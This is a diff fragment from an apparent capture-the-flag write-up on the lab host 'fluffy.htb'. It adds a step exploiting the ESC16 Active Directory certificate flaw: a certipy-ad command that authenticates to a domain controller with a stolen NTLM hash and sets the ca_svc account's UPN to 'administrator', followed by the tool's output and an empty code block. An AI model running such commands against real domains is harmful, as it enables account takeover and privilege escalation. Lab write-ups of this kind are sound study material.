@@ -449,3 +449,16 @@ Certificate Templates                   : [!] Could not find any certificate tem
 From this output its clear to see that its vulnerable to ESC16
 
 ## ESC16
+```python
+certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -upn 'administrator' -user 'ca_svc' update
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+```
+This updated the UPN of the `ca_svc` user
+
+```python
+
+```
